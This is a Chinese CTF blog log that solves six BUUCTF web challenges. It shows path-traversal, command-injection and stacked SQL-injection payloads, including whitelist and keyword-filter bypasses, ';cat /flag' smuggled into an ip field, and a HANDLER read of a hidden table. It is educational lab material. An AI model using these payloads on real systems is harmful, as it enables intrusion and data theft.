---
title: "CTF-web 做题日志 0x00 版"
description: "做题日志的第 0 版本，如有错误请指出。"
date: 2026-03-30T00:00:00+08:00
image: ctf_web_q0.jpg
math: true
license: 
hidden: false
comments: true
draft: false
categories:
    - ctf
tags:
    - ctf
    - 学习日志
---


### [HCTF 2018]WarmUp

[题目链接](https://buuoj.cn/challenges#[HCTF%202018]WarmUp)

首先查看原代码，有提示看一下 source.php 的东西。

看了一下把整个伪代码给你了。

<img width="1193" height="1256" alt="image" src="https://github.com/user-attachments/assets/08cd4e83-38bc-41d5-9993-ace6ba1749bb" />

`$_REQUEST['file']` 让我们把参数传进去，然后重点在 `::checkFile($_REQUEST['file'])`上吗，也就是把 file 的内容传给了形参 page 进入了这个检查函数，这个检查函数的重点在：

```
$_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
```

`mb_substr()` 函数从 $page 中第 0 个字符开始，截取 `mb_strpos($page . '?', '?')` 长度的字符。

`mb_strpos($page . '?', '?')` 其中 `$page . '?'` 的含义是在 $page 的后面接一个 '?' 字符，防止你输入没有这个。

然后再返回 $page 直到 '?' 的长度。

整个函数的大意就是把 $page 截取到第一个问号之前。

之后

```
if (in_array($_page, $whitelist)) {
                return true;
            }
```

表示当 $_page 是 $whitelist 中的元素之一时，放行。

所以我们可以写成 `?page=hint.php`，可以得到 flag 在 `ffffllllaaaagggg` 的信息。

然后为了绕过这个检查机制，我们在后面再写一个问号，即 `?file=hint.php?`

由于 .php 的 include 机制，即**即使当前目录下不存在 `hint.php` 文件**，当 `include(hint.php/..)` 时，由于其认为你进入了某个文件又返回上一级，相当于没做，所以不做操作。

因此可以绕过检查机制，构造 `?file=hint.php?../../../../../../../../ffffllllaaaagggg` 一路返回上一级找到 flag。

### [ACTF2020 新生赛]Exec

[题目链接](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Exec)

```
<?php
    $ip = $_POST['ip']; // 接收你输入的 IP
    // 直接拼接到 Linux ping 命令中并执行
    system("ping -c 3 " . $ip); 
?>
```

他会输入进 $ip 的东西全都当作 system 的一部分，所以我们可以键入 `127.0.0.1;ls`，`127.0.0.1;ls /`，`127.0.0.1;cat /flag`。

### [GXYCTF2019]Ping Ping Ping

[题目链接](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)

这个题有点神秘。

首先就是 `?ip=127.0.0.1;ls`，发现有 `index.php` 和 `flag.php` 两个文件。

然后先尝试 `?ip=127.0.0.1;cat flag.php`，提示 space 即空格不行。

所以换成 `$IFS$9` 间断符，提示 flag 不行。

但是 index 可以，所以可以得到屏蔽规则。

最后`?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php` 就可以了，flag 在页面原代码里隐藏。

### [SUCTF 2019]EasySQL

[题目链接](https://buuoj.cn/challenges#[SUCTF%202019]EasySQL)

这个题要求根据回答猜一下后端代码。

发现输入一些数字 `1` `123` 都会返回 1。

那么考虑其逻辑大概是 SELECT [input] [一些操作使input成为1]。

因此我们可以键入 `*,1`，就把 SELECT * 隔离开了。

### [极客大挑战 2019]Secret File

[题目链接](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File)

先看原代码，跳到 archiveroom.php。

然后打开 burp suite 拦截一下，在 repeater 里交，得到 response，里面有  secr3t.php  。

进入 secr3t.php，发现源码，然后没有禁止 filter，直接把 flag.php 的内容转 base64 输出出来就得到了。

### [强网杯 2019]随便注

[题目链接](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8)

检查源代码发现有提示 EasySQL。

随便输入点类似 `';SELECT database();` 之类的，发现返回：

`return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`

大概意思就是把这些关键字给禁了。

所以我们可用 `';show databases;' 得到数据库：

```
array(1) {
  [0]=>
  string(11) "ctftraining"
}

array(1) {
  [0]=>
  string(18) "information_schema"
}

array(1) {
  [0]=>
  string(5) "mysql"
}

array(1) {
  [0]=>
  string(18) "performance_schema"
}

array(1) {
  [0]=>
  string(9) "supersqli"
}

array(1) {
  [0]=>
  string(4) "test"
}
```

同理，`';SHOW VARIABLES LIKE '%version%';` 得到系统版本。

```
array(2) {
  [0]=>
  string(33) "in_predicate_conversion_threshold"
  [1]=>
  string(4) "1000"
}

array(2) {
  [0]=>
  string(14) "innodb_version"
  [1]=>
  string(7) "10.3.18"
}

array(2) {
  [0]=>
  string(16) "protocol_version"
  [1]=>
  string(2) "10"
}

array(2) {
  [0]=>
  string(22) "slave_type_conversions"
  [1]=>
  string(0) ""
}

array(2) {
  [0]=>
  string(31) "system_versioning_alter_history"
  [1]=>
  string(5) "ERROR"
}

array(2) {
  [0]=>
  string(22) "system_versioning_asof"
  [1]=>
  string(7) "DEFAULT"
}

array(2) {
  [0]=>
  string(7) "version"
  [1]=>
  string(15) "10.3.18-MariaDB"
}

array(2) {
  [0]=>
  string(15) "version_comment"
  [1]=>
  string(14) "MariaDB Server"
}

array(2) {
  [0]=>
  string(23) "version_compile_machine"
  [1]=>
  string(6) "x86_64"
}

array(2) {
  [0]=>
  string(18) "version_compile_os"
  [1]=>
  string(5) "Linux"
}

array(2) {
  [0]=>
  string(22) "version_malloc_library"
  [1]=>
  string(6) "system"
}

array(2) {
  [0]=>
  string(23) "version_source_revision"
  [1]=>
  string(40) "604f80e77c054758aa449064cdc29dfa13a71922"
}

array(2) {
  [0]=>
  string(19) "version_ssl_library"
  [1]=>
  string(27) "OpenSSL 1.1.1d  10 Sep 2019"
}

array(2) {
  [0]=>
  string(19) "wsrep_patch_version"
  [1]=>
  string(11) "wsrep_25.24"
}
```

其实一大串，比较重要的就是这个数据库的版本是 `10.3.18-MariaDB`。

输入 `';show tables;`，得到表信息：

```
array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}
```

猜测这个 words 表应该就是网站正常运行用的表。也就是输入 1 得到 hahaha，2 得到 miaomiaomiao。

这个 1919810931114514 表大概率藏着东西，由于表名是纯数字，而 **SQL 语法在表名或列名是纯数字时必须用特殊格式包裹表示。**

其中 mysql 以及本题的 MariaDB 使用反引号 ` `` ` 包裹，而 PostgreSQL 与 Oracle 用双引号 `""`，SQL Server / MSSQL 用方括号 `[]`。

总之我们用 HANDLER 强行打开读取这个表就可以了。

```
1'; HANDLER `1919810931114514` OPEN; HANDLER `1919810931114514` READ FIRST; #
```

